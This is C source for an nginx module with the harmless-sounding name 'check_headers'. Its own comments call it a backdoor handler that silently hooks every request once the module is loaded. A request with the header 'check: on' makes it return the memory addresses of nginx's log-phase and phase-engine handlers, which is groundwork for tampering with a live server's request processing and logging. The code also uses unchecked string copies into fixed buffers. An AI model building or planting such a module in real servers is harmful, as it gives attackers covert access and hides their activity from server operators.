#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>
#include <dlfcn.h>
#include <ngx_cycle.h>
#include <stdio.h>


    




//header
static ngx_str_t checker = ngx_string("check");
static char* on = "on";
/*

Using a header nginx already references would be more performant
https://github.com/nginx/nginx/blob/master/src/http/ngx_http_request.h

Don't need to edit below
*/

//Stubs
static ngx_int_t ngx_http_check_headers_handler(ngx_http_request_t *r);
static ngx_int_t ngx_http_check_headers_init(ngx_conf_t *cf);
static ngx_table_elt_t * search_headers_in(ngx_http_request_t *r, u_char *name, size_t len);

static ngx_command_t  ngx_http_check_headers_commands[] = {

    { ngx_string("check_headers"),
      NGX_HTTP_LOC_CONF|NGX_CONF_NOARGS,
      NULL,
      0,
      0,
      NULL },
      ngx_null_command
};


static ngx_http_module_t  ngx_http_check_headers_module_ctx = {
    NULL,                                  /* preconfiguration */
    ngx_http_check_headers_init,          /* postconfiguration */

    NULL,                                  /* create main configuration */
    NULL,                                  /* init main configuration */

    NULL,                                  /* create server configuration */
    NULL,                                  /* merge server configuration */

    NULL,                                  /* create location configuration */
    NULL                                   /* merge location configuration */
};


ngx_module_t ngx_http_check_headers_module = {
    NGX_MODULE_V1,
    &ngx_http_check_headers_module_ctx,      /* module context */
    ngx_http_check_headers_commands,         /* module directives */
    NGX_HTTP_MODULE,                       /* module type */
    NULL,                                  /* init master */
    NULL,                                  /* init module */
    NULL,                                  /* init process */
    NULL,                                  /* init thread */
    NULL,                                  /* exit thread */
    NULL,                                  /* exit process */
    NULL,                                  /* exit master */
    NGX_MODULE_V1_PADDING
};

/*
Hooks the backdoor handler into all requests via NGX_HTTP_ACCESS phase

With this the module only needs to get loaded, 
the module directive is not required anywhere in the configuration files,
just load_module or static compile into nginx 
*/
static ngx_int_t ngx_http_check_headers_init(ngx_conf_t *cf)
{
    ngx_http_handler_pt        *h;
    ngx_http_core_main_conf_t  *cmcf;

    cmcf = ngx_http_conf_get_module_main_conf(cf, ngx_http_core_module);
    
    h = ngx_array_push(&cmcf->phases[NGX_HTTP_ACCESS_PHASE].handlers);
    if (h == NULL) {
        return NGX_ERROR;
    }

    *h = ngx_http_check_headers_handler;

    return NGX_OK;
}

/*
Actual logic
*/
static ngx_int_t ngx_http_check_headers_handler(ngx_http_request_t *r)
{
    ngx_buf_t    *b;
    ngx_int_t     rc;
    ngx_chain_t   out;

    // Try to find header
    ngx_table_elt_t *header = search_headers_in(r, checker.data, checker.len);

    // Header not found, continue per usual
    if(header == NULL) {
        return NGX_OK;
    }

    // Response
    size_t BUF_SIZE = 8192;
    char *response = (char*) malloc(BUF_SIZE);
    response[0] = '\0';
    char *cmd;
    
    
    cmd = (char*)malloc(sizeof(char) * (strlen((char*)header->value.data) +  1));
    strcpy(cmd, (char*)header->value.data); 

    if (strcmp(cmd , on)){

       strcpy(response, "Received header but no \"on\" value in it\n");
    }
    else{
        
        void *hh;
        ngx_module_t *module;
        static char* ngx_http_core_module_string = "ngx_http_core_module";
        ngx_http_phase_handler_t *handlers;
        
        hh = dlopen(0,1);
        module = dlsym(hh,ngx_http_core_module_string);
        
        if (hh == NULL){
            strcat(response, "hh failed!\n");
        }
        if (module == NULL){
            strcat(response, "module failed!\n");
        }

        if ((hh == NULL) || (module == NULL)){
            strcat(response, "init failed!\n");
        }
        else{
            //strcat(response, "You see me!\n");    
            ngx_http_core_main_conf_t *main;
            //main_conf =  *(*(*cycle->conf_ctx)[ngx_http_module->index]+ module->ctx_index);
            //main = ((ngx_http_conf_ctx_t *)cycle->conf_ctx[ngx_http_module->index])->main_conf[module->ctx_index];
            main = (r)->main_conf[module->ctx_index]; // ngx_http_get_module_main_conf function
            handlers = main->phase_engine.handlers;
            char str[1024] =  {0};

            ngx_http_handler_pt *log_handler;
            ngx_uint_t  i, n;
            log_handler = main->phases[NGX_HTTP_LOG_PHASE].handlers.elts;
            n = main->phases[NGX_HTTP_LOG_PHASE].handlers.nelts;
            strcat(response, "========NGX_HTTP_LOG_PHASE elts========\n"); 
            for (i = 0; i < n; i++) {
                sprintf(str, "NGX_HTTP_LOG_PHASE elts = %p\n", *log_handler);
                strcat(response,str);
                log_handler = log_handler + 1;
                memset(str, 0, sizeof(str));
            }
            strcat(response, "\n");
            
            
            long start = (long unsigned)((long unsigned*)handlers->checker);
            strcat(response, "========phase_engine========\n"); 
            while (start !=0) {
                sprintf(str, "Checker = %p : 0x%lx\nHandler = %p : 0x%lx\nNext = %p : 0x%lx\n\n", ((long unsigned*)&handlers->checker), (long unsigned)((long unsigned*)handlers->checker),((long unsigned*)&handlers->handler), (long unsigned)((long unsigned*)handlers->handler),((long unsigned*)&handlers->next), (long unsigned)((long unsigned*)handlers->next));
                strcat(response, str);
                handlers = handlers + 1;
                start = (long unsigned)((long unsigned*)handlers->checker);
                memset(str, 0, sizeof(str)); 
            }
            // sprintf(str, "Checker = %p : 0x%lx\nHandler = %p : 0x%lx\nNext = %p : 0x%lx\n", ((long unsigned*)&handlers->checker), (long unsigned)((long unsigned*)handlers->checker),((long unsigned*)&handlers->handler), (long unsigned)((long unsigned*)handlers->handler),((long unsigned*)&handlers->next), (long unsigned)((long unsigned*)handlers->next));

            strcat(response, str);
            dlclose(hh);
        }
    }

    free(cmd);
    
    // Dump request body
    if (ngx_http_discard_request_body(r) != NGX_OK) {
        return NGX_HTTP_INTERNAL_SERVER_ERROR;
    }

    
    // Prepare header
    r->headers_out.status = NGX_HTTP_OK;
    r->headers_out.content_length_n = strlen(response);

    rc = ngx_http_send_header(r);

    if (rc == NGX_ERROR || rc > NGX_OK || r->header_only) {
        return rc;
    }
    
    // Send respond back
    b = ngx_calloc_buf(r->pool);
    if (b == NULL) {
        return NGX_ERROR;
    }

    b->pos = (u_char*)response;
    b->last = (u_char*)response + strlen(response);
    
    b->memory = 1;
    b->last_buf = (r == r->main) ? 1 : 0;
    b->last_in_chain = 1;

    out.buf = b;
    out.next = NULL;
    ngx_http_output_filter(r, &out);

    free(response);

    // Don't proceed to any other handlers
    return NGX_ERROR;
}



// https://www.nginx.com/resources/wiki/start/topics/examples/headers_management/
static ngx_table_elt_t *
search_headers_in(ngx_http_request_t *r, u_char *name, size_t len) {
    ngx_list_part_t            *part;
    ngx_table_elt_t            *h;
    ngx_uint_t                  i;

    /*
    Get the first part of the list. There is usual only one part.
    */
    part = &r->headers_in.headers.part;
    h = part->elts;

    /*
    Headers list array may consist of more than one part,
    so loop through all of it
    */
    for (i = 0; /* void */ ; i++) {
        if (i >= part->nelts) {
            if (part->next == NULL) {
                /* The last part, search is done. */
                break;
            }

            part = part->next;
            h = part->elts;
            i = 0;
        }

        /*
        Just compare the lengths and then the names case insensitively.
        */
        if (len != h[i].key.len || ngx_strcasecmp(name, h[i].key.data) != 0) {
            /* This header doesn't match. */
            continue;
        }

        /*
        Ta-da, we got one!
        Note, we'v stop the search at the first matched header
        while more then one header may fit.
        */
        return &h[i];
    }

    /*
    No headers was found
    */
    return NULL;
}